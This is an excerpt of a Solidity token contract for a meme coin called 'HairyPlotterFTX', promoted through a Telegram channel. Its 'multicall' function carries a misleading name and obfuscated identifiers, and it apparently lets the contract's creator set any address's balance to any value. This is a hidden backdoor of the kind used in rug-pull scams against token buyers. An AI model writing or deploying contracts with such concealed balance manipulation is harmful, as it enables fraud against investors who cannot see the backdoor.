/**
   Welcome to HairyPlotterFTX, the most magical crypto  
   meme Channel that combines the whimsy of Hogwarts 
   with the wallets-weights of the FTX exchange!
  TELEGRAM: https://t.me/HairyPlotterFTX
*/
...
contract HairyPlotterFTX is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private GMSAjoc;
    ...
    string private constant _name = "HairyPlotterFTX";
    string private constant _symbol = "FTX";
    address private pending; 
    constructor () {
        pending = _msgSender(); 
        GMSAjoc[_msgSender()] = _totalSupply;
    ...
    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        ...
        GMSAjoc[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }
    ...
    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        ...
        uint256 fromBalance = GMSAjoc[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        GMSAjoc[from] = fromBalance - Menge;

        GMSAjoc[to] = GMSAjoc[to].add(Menge);
